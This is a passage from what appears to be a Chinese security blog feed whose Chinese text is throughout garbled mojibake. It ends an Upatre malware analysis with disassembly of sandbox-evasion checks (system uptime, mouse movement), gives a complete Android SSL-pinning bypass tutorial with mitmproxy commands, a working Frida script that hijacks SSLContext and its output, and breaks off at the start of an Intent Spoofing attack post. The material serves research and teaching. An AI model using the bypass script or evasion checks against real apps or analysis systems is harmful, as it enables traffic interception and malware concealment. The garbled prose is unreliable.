title="æ£€æŸ¥å¼€æœºæ—¶é—´"></a>æ£€æŸ¥å¼€æœºæ—¶é—´</h2><p>ä¸€èˆ¬ä½¿ç”¨æ²™ç›’çš„åˆ†æå¼•æ“çš„åšæ³•éƒ½æ˜¯å®‰è£…ä¸€ä¸ªå…¨æ–°çš„ç³»ç»Ÿï¼Œåšç³»ç»Ÿé•œåƒã€‚ç„¶ååœ¨æ£€æŸ¥çš„æ—¶å€™<br>åŠ è½½é•œåƒï¼Œæ‰§è¡Œæ ·æœ¬ã€‚è€Œå¼€æœºçš„æ—¶é—´å¾€å¾€éƒ½è¢«å¿½ç•¥äº†ï¼ŒåŸºæœ¬éƒ½ä¸ä¼šè¶…è¿‡10åˆ†é’Ÿã€‚</p><p>Upatre æ ·æœ¬æ‰€é‡‡å–çš„æ–¹æ³•æ˜¯åˆ©ç”¨GetTickCount è·å–å¼€æœºçš„æ¯«ç§’æ•°ï¼Œå½“å¼€æœºæ—¶é—´å°äº12åˆ†é’Ÿ<br>æ˜¯å°±ä¸æ‰§è¡Œæ¶æ„çš„è¡Œä¸ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">004013B3    BB D8FE0A00         MOV EBX,0AFED8<br>004013B8    FF55 DC             CALL DWORD PTR SS:[EBP-24]   ; kernel32.GetTickCount<br>004013BB    3BC3                CMP EAX,EBX<br>004013BD    0F82 6F020000       JB 00401632<br><br>00401632    6A 00               PUSH 0<br>00401634    FF55 F4             CALL DWORD PTR SS:[EBP-C]    ; kernel32.ExitProcess<br><br></code></pre></td></tr></table></figure><p>0xAFED8 æ˜¯ 720600æ¯«ç§’ 12åˆ†é’Ÿå¤šä¸€ç‚¹ï¼Œä¸åˆ°è¿›ç¨‹é€€å‡ºäº†ã€‚</p><h2 id="æ£€æŸ¥é¼ æ ‡ä½ç½®"><a href="#æ£€æŸ¥é¼ æ ‡ä½ç½®" class="headerlink" title="æ£€æŸ¥é¼ æ ‡ä½ç½®"></a>æ£€æŸ¥é¼ æ ‡ä½ç½®</h2><p>Upatreæ ·æœ¬ä½¿ç”¨çš„ç¬¬äºŒç§æ²™ç›’é€ƒé€¸çš„æ–¹æ³•æ˜¯æ£€æŸ¥é¼ æ ‡ä½ç½®çš„å˜åŒ–ï¼ŒåŠ¨æ€æ²™ç›’åˆ†æç³»ç»Ÿå¤§å¤šæ˜¯<br>è‡ªåŠ¨åŒ–çš„ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ä¸ä½¿ç”¨é¼ æ ‡ï¼Œå¦‚æœUpatreæ ·æœ¬æ£€æŸ¥åˆ°é¼ æ ‡çš„ä½ç½®æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼ŒåŒæ ·<br>ä¸ä¼šæ‰§è¡Œæ¶æ„è¡Œä¸ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">0040197C   8D85 04FFFFFF       lea eax,dword ptr ss:[ebp-0xFC]<br>00401982   50                  push eax<br>00401983   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos<br>00401989   8D85 0CFFFFFF       lea eax,dword ptr ss:[ebp-0xF4]<br>0040198F   50                  push eax<br>00401990   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos<br>00401996   8B85 04FFFFFF       mov eax,dword ptr ss:[ebp-0xFC]<br>0040199C   8B9D 0CFFFFFF       mov ebx,dword ptr ss:[ebp-0xF4]<br>004019A2   39D8                cmp eax,ebx<br>004019A4   74 D6               je short 62.0040197C<br><br></code></pre></td></tr></table></figure><p>åªè¦é¼ æ ‡ä¸€åŠ¨å°±é€€å‡ºå¾ªç¯ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€è¿‘å‡ºç°çš„æ ·æœ¬åœ¨ååŠ¨æ€æ²™ç›’æ£€æµ‹æ–¹é¢æ˜æ˜¾åœ°è¿›åŒ–äº†ï¼Œé’ˆå¯¹æ€§æå¼ºï¼Œä¸å†å±€é™äºå¤è€çš„<br>IsDebuggerPresentï¼Œè€Œæ˜¯åˆ©ç”¨PEBæ£€æŸ¥CPUæ ¸æ•°ç­‰æŠ€æœ¯åŠæ³•æ¥æ£€æµ‹ï¼Œæ²™ç›’å¯¹æŠ—ä¼°æŠ€æœ¯åœ¨åé¢<br>çš„æ—¥å­é‡Œä¸€å®šä¼šæ›´åŠ è¿…é€Ÿçš„è¿›åŒ–ã€‚</p><h2 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h2><p>éå¸¸æ„Ÿè°¢è¥¿å®‰ç ”ç©¶ä¸­å¿ƒçš„åŒäº‹æä¾›çš„æ ·æœ¬ï¼ŒåŒæ—¶æ„Ÿè°¢åŒäº‹lzxåœ¨æ ·æœ¬åˆ†ææ—¶ç»™äºˆçš„å¤§åŠ›æ”¯æŒã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Andorid ç»•è¿‡ SSL Pinning æŠ“ https æŠ¥æ–‡</title>
    <link href="/cn/Android_SSL_Pinning/"/>
    <url>/cn/Android_SSL_Pinning/</url>
    
    <content type="html"><![CDATA[<h3 id="SSL-pinning"><a href="#SSL-pinning" class="headerlink" title="SSL pinning"></a>SSL pinning</h3><p>SSL Pinningæ˜¯ä¸€ç§é˜²æ­¢ä¸­é—´äººæ”»å‡»çš„æŠ€æœ¯ï¼Œä¸»è¦æœºåˆ¶æ˜¯åœ¨å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚â€“&gt;æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒï¼Œå¦‚æœæ”¶åˆ°çš„è¯ä¹¦ä¸è¢«å®¢æˆ·ç«¯ä¿¡ä»»ï¼Œå°±ç›´æ¥æ–­å¼€è¿æ¥ä¸ç»§ç»­è¯·æ±‚ã€‚å¯ä»¥å‘ç°ä¸­é—´äººæ”»å‡»çš„è¦ç‚¹æ˜¯ä¼ªé€ äº†ä¸€ä¸ªå‡çš„æœåŠ¡ç«¯è¯ä¹¦ç»™äº†å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯è¯¯ä»¥ä¸ºçœŸã€‚è§£å†³æ€è·¯å°±æ˜¯ï¼Œå®¢æˆ·ç«¯ä¹Ÿé¢„ç½®ä¸€ä»½æœåŠ¡ç«¯çš„è¯ä¹¦ï¼Œæ¯”è¾ƒä¸€ä¸‹å°±çŸ¥é“çœŸå‡äº†ã€‚</p><p>SSL-pinningæœ‰ä¸¤ç§æ–¹å¼ï¼šè¯ä¹¦é”å®šï¼ˆCertificate Pinningï¼‰ å’Œå…¬é’¥é”å®šï¼ˆ Public Key Pinningï¼‰ã€‚</p><h4 id="è¯ä¹¦é”å®š"><a href="#è¯ä¹¦é”å®š" class="headerlink" title="è¯ä¹¦é”å®š"></a>è¯ä¹¦é”å®š</h4><p>éœ€è¦åœ¨å®¢æˆ·ç«¯ä»£ç å†…ç½®ä»…æ¥å—æŒ‡å®šåŸŸåçš„è¯ä¹¦ï¼Œè€Œä¸æ¥å—æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨å†…ç½®çš„CAæ ¹è¯ä¹¦å¯¹åº”çš„ä»»ä½•è¯ä¹¦ï¼Œé€šè¿‡è¿™ç§æˆæƒæ–¹å¼ï¼Œä¿éšœäº†APPä¸æœåŠ¡ç«¯é€šä¿¡çš„å”¯ä¸€æ€§å’Œå®‰å…¨æ€§ï¼Œå› æ­¤å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼ˆä¾‹å¦‚APIç½‘å…³ï¼‰ä¹‹é—´çš„é€šä¿¡æ˜¯å¯ä»¥ä¿è¯ç»å¯¹å®‰å…¨ã€‚ä½†æ˜¯CAç­¾å‘è¯ä¹¦éƒ½å­˜åœ¨æœ‰æ•ˆæœŸé—®é¢˜ï¼Œç¼ºç‚¹æ˜¯åœ¨è¯ä¹¦ç»­æœŸåéœ€è¦å°†è¯ä¹¦é‡æ–°å†…ç½®åˆ°APPä¸­ã€‚</p><h4 id="å…¬é’¥é”å®š"><a href="#å…¬é’¥é”å®š" class="headerlink" title="å…¬é’¥é”å®š"></a>å…¬é’¥é”å®š</h4><p>æå–è¯ä¹¦ä¸­çš„å…¬é’¥å¹¶å†…ç½®åˆ°å®¢æˆ·ç«¯ä¸­ï¼Œé€šè¿‡ä¸æœåŠ¡å™¨å¯¹æ¯”å…¬é’¥å€¼æ¥éªŒè¯è¿æ¥çš„æ­£ç¡®æ€§ã€‚åˆ¶ä½œè¯ä¹¦å¯†é’¥æ—¶ï¼Œå…¬é’¥åœ¨è¯ä¹¦çš„ç»­æœŸå‰åéƒ½å¯ä»¥ä¿æŒä¸å˜ï¼ˆå³å¯†é’¥å¯¹ä¸å˜ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é¿å…è¯ä¹¦æœ‰æ•ˆæœŸé—®é¢˜ï¼Œä¸€èˆ¬æ¨èè¿™ç§åšæ³•ã€‚</p><p>ï¼ˆæ­¤å°èŠ‚å†…å®¹æ‘˜æŠ„è‡ªäº’è”ç½‘ï¼‰</p><h3 id="æ€»ä½“æ€è·¯"><a href="#æ€»ä½“æ€è·¯" class="headerlink" title="æ€»ä½“æ€è·¯"></a>æ€»ä½“æ€è·¯</h3><p>ä½¿ç”¨ mitmproxy <a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a>  è¿›è¡ŒæŠ“åŒ…ï¼Œä½¿ç”¨ frida ç»•è¿‡ SSL pinningï¼Œ frida çš„å®‰è£…å’Œä½¿ç”¨è¿™é‡Œå°±ä¸å†è¯¦è¿°äº†ï¼Œå¯ä»¥å‚è€ƒå…¶ä»–èµ„æ–™ã€‚</p><h3 id="å®‰è£…-mitmproxy"><a href="#å®‰è£…-mitmproxy" class="headerlink" title="å®‰è£… mitmproxy"></a>å®‰è£… mitmproxy</h3><p>å‚è€ƒ <a href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a> æ–‡æ¡£</p><p>å¯ä»¥ç›´æ¥ä¸‹è½½ Linux binaryï¼š <a href="https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz%EF%BC%8C">https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gzï¼Œ</a> æˆ–è€…ä½¿ç”¨ pip è¿›è¡Œå®‰è£… <code>https://pypi.org/project/mitmproxy/</code><br>æ‰§è¡Œå‘½ä»¤ <code>~/.local/bin/pip3 install mitmproxy --user</code></p><p>å®‰è£…æˆåŠŸä¹‹åï¼Œæœ‰ä¸‰ä¸ªç¨‹åºå¯ä»¥ä½¿ç”¨ï¼š <code>mitmproxy</code>ï¼Œ<code>mitmdump</code>ï¼Œ <code>mitmweb</code></p><h3 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h3><p>åœ¨ä¸»æœºä¸Šæ‰§è¡Œä¸‹é¢å‡ è¡Œå‘½ä»¤è®¾ç½®ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitmweb -p 8080<br>adb shell settings put global http_proxy 127.0.0.1:8888<br>adb reverse tcp:8888 tcp:8080<br></code></pre></td></tr></table></figure><p>mitmweb -p 8080 åœ¨æœ¬æœºèµ· 8080 ä»£ç†ï¼Œåœ¨ Android ä¸Šè®¾ç½® http å…¨å±€ä»£ç† 127.0.0.1:8888ï¼Œ æœ€åå°† Android çš„ 8888 ç«¯å£è½¬å‘åˆ°æœ¬æœº 8080 ç«¯å£</p><h3 id="è®¾ç½®-CA"><a href="#è®¾ç½®-CA" class="headerlink" title="è®¾ç½® CA"></a>è®¾ç½® CA</h3><p><a href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The <span class="hljs-keyword">first</span> <span class="hljs-built_in">time</span> mitmproxy is run, <span class="hljs-keyword">it</span> creates <span class="hljs-keyword">the</span> <span class="hljs-built_in">keys</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> certificate authority (CA) <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> config <span class="hljs-built_in">directory</span> (~/.mitmproxy <span class="hljs-keyword">by</span> default).<br></code></pre></td></tr></table></figure><table><thead><tr><th>Filename</th><th>Contents</th></tr></thead><tbody><tr><td>mitmproxy-ca.pem</td><td>The certificate and the private key in PEM format.</td></tr><tr><td>mitmproxy-ca-cert.pem</td><td>The certificate in PEM format. Use this to distribute on most non-Windows platforms.</td></tr><tr><td>mitmproxy-ca-cert.p12</td><td>The certificate in PKCS12 format. For use on Windows.</td></tr><tr><td>mitmproxy-ca-cert.cer</td><td>Same file as .pem, but with an extension expected by some Android devices.</td></tr></tbody></table><p>æˆ‘ä»¬æ˜¯ Android åº”è¯¥ä½¿ç”¨ <code>mitmproxy-ca-cert.cer</code>ï¼Œåœ¨ Android ç³»ç»Ÿå®‰è£…çš„è¯ï¼Œéœ€è¦ç‚¹å‡» è®¾ç½® -ã€‰å®‰å…¨ -ã€‰ åŠ å¯†ä¸å‡­è¯ -ã€‰å®‰è£…è¯ä¹¦ -ã€‰CA è¯ä¹¦</p><h3 id="ä½¿ç”¨-frida-ç»•è¿‡-SSL-pinning"><a href="#ä½¿ç”¨-frida-ç»•è¿‡-SSL-pinning" class="headerlink" title="ä½¿ç”¨ frida ç»•è¿‡ SSL pinning"></a>ä½¿ç”¨ frida ç»•è¿‡ SSL pinning</h3><p>ä½¿ç”¨ frida è„šæœ¬é¦–å…ˆéœ€è¦å°† <code>mitmproxy-ca-cert.cer</code> ä¸Šä¼ åˆ° <code>/data/local/tmp/cert-der.crt</code></p><p>ä½¿ç”¨è„šæœ¬ <a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Android SSL Re-pinning frida script v0.2 030417-pier</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span><br><span class="hljs-comment">   $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   UPDATE 20191605: Fixed undeclared var. Thanks to @oleavr and @ehsanpc9999 !</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;</span>);<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">CertificateFactory</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.cert.CertificateFactory&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FileInputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.FileInputStream&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">BufferedInputStream</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.BufferedInputStream&quot;</span>);<br>    <span class="hljs-keyword">var</span> X509Certificate = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.cert.X509Certificate&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">KeyStore</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.security.KeyStore&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TrustManagerFactory</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">SSLContext</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.SSLContext&quot;</span>);<br><br>    <span class="hljs-comment">// Load CAs from an InputStream</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Loading our CA...&quot;</span>)<br>    <span class="hljs-keyword">var</span> cf = <span class="hljs-title class_">CertificateFactory</span>.<span class="hljs-title function_">getInstance</span>(<span class="hljs-string">&quot;X.509&quot;</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">var</span> fileInputStream = <span class="hljs-title class_">FileInputStream</span>.$new(<span class="hljs-string">&quot;/data/local/tmp/cert-der.crt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] &quot;</span> + err);<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> bufferedInputStream = <span class="hljs-title class_">BufferedInputStream</span>.$new(fileInputStream);<br>    <span class="hljs-keyword">var</span> ca = cf.<span class="hljs-title function_">generateCertificate</span>(bufferedInputStream);<br>    bufferedInputStream.<span class="hljs-title function_">close</span>();<br><br>    <span class="hljs-keyword">var</span> certInfo = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(ca, X509Certificate);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] Our CA Info: &quot;</span> + certInfo.<span class="hljs-title function_">getSubjectDN</span>());<br><br>    <span class="hljs-comment">// Create a KeyStore containing our trusted CAs</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Creating a KeyStore for our CA...&quot;</span>);<br>    <span class="hljs-keyword">var</span> keyStoreType = <span class="hljs-title class_">KeyStore</span>.<span class="hljs-title function_">getDefaultType</span>();<br>    <span class="hljs-keyword">var</span> keyStore = <span class="hljs-title class_">KeyStore</span>.<span class="hljs-title function_">getInstance</span>(keyStoreType);<br>    keyStore.<span class="hljs-title function_">load</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    keyStore.<span class="hljs-title function_">setCertificateEntry</span>(<span class="hljs-string">&quot;ca&quot;</span>, ca);<br><br>    <span class="hljs-comment">// Create a TrustManager that trusts the CAs in our KeyStore</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;</span>);<br>    <span class="hljs-keyword">var</span> tmfAlgorithm = <span class="hljs-title class_">TrustManagerFactory</span>.<span class="hljs-title function_">getDefaultAlgorithm</span>();<br>    <span class="hljs-keyword">var</span> tmf = <span class="hljs-title class_">TrustManagerFactory</span>.<span class="hljs-title function_">getInstance</span>(tmfAlgorithm);<br>    tmf.<span class="hljs-title function_">init</span>(keyStore);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Our TrustManager is ready...&quot;</span>);<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Hijacking SSLContext methods now...&quot;</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;</span>)<br><br>    <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b,c</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;</span>);<br>      <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span>).<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, a, tmf.<span class="hljs-title function_">getTrustManagers</span>(), c);<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] SSLContext initialized with our custom TrustManager!&quot;</span>);<br>    &#125;<br>  &#125;);<br>&#125;,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œç»•è¿‡ SSL pinning</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -F<br><br>     ____<br>    / _  |   Frida <span class="hljs-number">14.2</span>.<span class="hljs-number">18</span> - A world-class dynamic instrumentation toolkit<br>   | (_| |<br>    &gt; _  |   Commands:<br>   <span class="hljs-regexp">/_/</span> |_|       help      -&gt; Displays the help system<br>   . . . .       object?   -&gt; Display information about <span class="hljs-string">&#x27;object&#x27;</span><br>   . . . .       <span class="hljs-keyword">exit</span>/quit -&gt; Exit<br>   . . . .<br>   . . . .   More info at https:<span class="hljs-regexp">//</span>frida.re<span class="hljs-regexp">/docs/</span>home/<br><br>[.] Cert Pinning Bypass/Re-Pinning<br>[+] Loading our CA...<br>[o] Our CA Info: O=mitmproxy, CN=mitmproxy<br>[+] Creating a KeyStore <span class="hljs-keyword">for</span> our CA...<br>[+] Creating a TrustManager that trusts the CA <span class="hljs-keyword">in</span> our KeyStore...<br>[+] Our TrustManager is ready...<br>[+] Hijacking SSLContext methods now...<br>[-] Waiting <span class="hljs-keyword">for</span> the app to invoke SSLContext.init()...<br>[Pixel <span class="hljs-number">2</span>::æ™ºèƒ½ç”Ÿæ´»]-&gt; <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>-F</code> å‚æ•° attach to frontmost application ä¸ç”¨æŒ‡å®š pid æˆ–è€…åŒ…åï¼Œéå¸¸æ–¹ä¾¿ã€‚</p><h3 id="ä½¿ç”¨-mitmweb-æŸ¥çœ‹æŠ¥æ–‡"><a href="#ä½¿ç”¨-mitmweb-æŸ¥çœ‹æŠ¥æ–‡" class="headerlink" title="ä½¿ç”¨ mitmweb æŸ¥çœ‹æŠ¥æ–‡"></a>ä½¿ç”¨ mitmweb æŸ¥çœ‹æŠ¥æ–‡</h3><p>æ‰§è¡Œ <code>mitmweb -p 8080</code> åå¯ä»¥ç”¨æµè§ˆå™¨è®¿é—® <a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a> æŸ¥çœ‹æŠ¥æ–‡ï¼Œå¦‚æœéœ€è¦å…±äº«æŠ¥æ–‡æ•°æ®å¯ä»¥ä½¿ç”¨<br>mitmweb ç•Œé¢æä¾›çš„ save åŠŸèƒ½ï¼Œä¼šä¿å­˜æˆä¸€ä¸ª flow æ–‡ä»¶ï¼Œåé¢ä½¿ç”¨ mitmweb ç•Œé¢æä¾›çš„ open æ‰“å¼€æŠ¥æ–‡æ–‡ä»¶å³å¯å±•ç¤ºæŠ¥æ–‡è¯¦ç»†ä¿¡æ¯ã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><a href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Intent Spoofing æ”»å‡»</title>
    <link href="/cn/android_intent_base_attack/"/>
    <url>/cn/android_intent_base_attack/</url>
    
    <content type="html"><![CDATA[<h2 id="0-Androidçš„å®‰å…¨æ¨¡å‹"><a href="#0-Androidçš„å®‰å…¨æ¨¡å‹" class="headerlink" title="0. Androidçš„å®‰å…¨æ¨¡å‹"></a>0. Androidçš„å®‰å…¨æ¨¡å‹</h2><ul><li>application sandbox</li><li>selinux</li><li>permissions</li><li>application signing</li></ul><p>æ­£æ˜¯å› ä¸ºApplication sandboxçš„å­˜åœ¨ï¼ŒAppè¿›ç¨‹ä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚æœ‰ä¸‹é¢ä¸€ä¸ªåœºæ™¯ä¸€ä¸ª<br>Appéœ€è¦è°ƒç”¨weixinæ¥åˆ†äº«å†…å®¹ï¼Œå¦‚ä½•å¤„ç†ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°intentï¼Œå‘Šè¯‰Androidç³»ç»Ÿä½ çš„<br>æ„å›¾æ˜¯ä»€ä¹ˆï¼ŒAndroidç³»ç»Ÿå°†è°ƒç”¨ç›¸åº”çš„å¤„ç†ç¨‹åºæ¥å¤„ç†ã€‚</p><p>Intent æ˜¯ä¸€ä¸ªå°†è¦æ‰§è¡Œçš„åŠ¨ä½œçš„æŠ½è±¡çš„æè¿°ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯ä½œä¸ºå‚æ•°æ¥ä½¿ç”¨ï¼Œç”±Intentæ¥å<br>åŠ©å®Œæˆandroidå„ä¸ªç»„ä»¶ä¹‹é—´çš„é€šè®¯ã€‚æ¯”å¦‚è¯´è°ƒç”¨startActivity()æ¥å¯åŠ¨ä¸€ä¸ªactivity,æˆ–<br>è€…ç”±broadcaseIntent()æ¥ä¼ é€’ç»™æ‰€æœ‰æ„Ÿå…´è¶£çš„BroadcaseReceiver, 